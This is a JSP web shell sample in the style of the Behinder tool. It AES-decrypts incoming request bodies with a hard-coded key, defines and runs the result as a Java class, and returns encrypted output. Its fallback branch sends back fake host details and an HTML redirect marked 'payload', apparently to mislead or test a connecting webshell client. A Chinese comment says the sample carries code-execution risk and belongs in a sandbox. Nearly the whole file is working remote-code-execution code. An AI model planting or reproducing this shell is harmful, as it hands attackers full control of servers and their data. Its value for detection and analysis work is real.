<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Constructor" %>


<%!
    class U extends ClassLoader{
        U(ClassLoader c){super(c);}
        public String g(byte []b) throws Exception {
            Class cla = super.defineClass(b,0,b.length);
            Constructor con = cla.getDeclaredConstructor();
            con.setAccessible(true);
            //存在代码执行的风险，请将该样本放置到测试环境、沙盒环境。
            Object ob = con.newInstance();
            Field[] ff = cla.getDeclaredFields();
            String content = null;
            for (Field f: ff
            ) {
                if(f.getName().equals("content")) {
                    content =(String) f.get(ob);
                    break;
                }
            }
            //System.out.println("in:" + content);
            return  content;
        }
    }
%>


<%

    String k = "e45e329feb5d925b";
    Cipher c = Cipher.getInstance("AES");
    c.init(2, new SecretKeySpec(k.getBytes("UTF-8"), "AES"));
    String content = new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())));
    String rsq = "";


    byte[] raw = k.getBytes("utf-8");
    SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
    Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
    cipher.init(1, skeySpec);

    if (content != null) {
        //{"msg":"YWJj","status":"c3VjY2Vzcw=="}
        rsq = String.format("{\"msg\":\"%s\",\"status\":\"%s\"}", Base64.getEncoder().encodeToString(content.getBytes("UTF-8")), Base64.getEncoder().encodeToString("success".getBytes("UTF-8")));
    } else {
        String msg_osInfo = "V2luZG93cyA4LjE2LjN4ODY=";
        String msg_driveList = "QzpcOw==";
        String msg_localIp = "MTcyLjE2OC4xLjEyOA==";
        String msg_currentPath = "QzpcVXNlcnNcamllY2hhblxqZGsxLjhcYmlu";
        String msg_arch = "eDg2";
        // payload
        String msg_basicInfo = "<html><meta http-equiv=\"refresh\" content=\"0; url=https://www.baidu.com\"></html>";
        msg_basicInfo = java.util.Base64.getEncoder().encodeToString(msg_basicInfo.getBytes("UTF-8"));
        String msg = String.format("{\"osInfo\":\"%s\",\"driveList\":\"%s\",\"currentPath\":\"%s\",\"arch\":\"%s\",\"basicInfo\":\"%s\"}", msg_osInfo, msg_driveList, msg_currentPath, msg_arch, msg_basicInfo);
        //msg = java.util.Base64.getEncoder().encodeToString(msg.getBytes("UTF-8"));
        rsq = msg;
    }
    byte[] rsq1 = cipher.doFinal(rsq.getBytes("UTF-8"));
    response.getOutputStream().write(rsq1);
    response.getOutputStream().flush();
%>